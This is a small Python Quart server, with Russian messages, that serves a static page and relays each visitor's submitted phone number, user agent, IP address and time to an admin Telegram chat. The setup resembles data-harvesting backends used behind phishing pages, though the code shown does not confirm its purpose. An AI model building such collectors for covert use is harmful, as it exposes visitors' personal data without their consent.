import os
from quart import Quart, request, send_from_directory 
from telegram import Bot  
from dotenv import load_dotenv  
from quart_cors import cors  

load_dotenv() 

app = Quart(__name__, static_folder='static')
app = cors(app)  # Разрешаем CORS 

bot = Bot(token=os.getenv("BOT_TOKEN"))

@app.route('/bot', methods=['POST'])
async def handle_bot():
    data = await request.get_json() 
    phone = data.get("phone")
    user_agent = data.get("userAgent")
    hours = data.get("hours")
    minutes = data.get("minutes")
    seconds = data.get("seconds")
    ip = request.remote_addr 

    message = f"Номер: {phone}\nUser-Agent: {user_agent}\nIP: {ip}\nТекущее время: {hours}:{minutes}:{seconds}"
    print(message)  

    try:
        await bot.send_message(chat_id=os.getenv("ADMIN_CHAT_ID"), text=message)
        print("Сообщение отправлено")
    except Exception as e:
        print("Ошибка Telegram:", e)

    return "OK", 200 

@app.route('/')
async def index():
    return await send_from_directory('static', 'index.html')

@app.route('/<path:filename>')
async def static_files(filename):
    return await send_from_directory('static', filename)

if __name__ == "__main__":
    print("Сервер запущен: http://localhost:5555")
    app.run(port=5555)
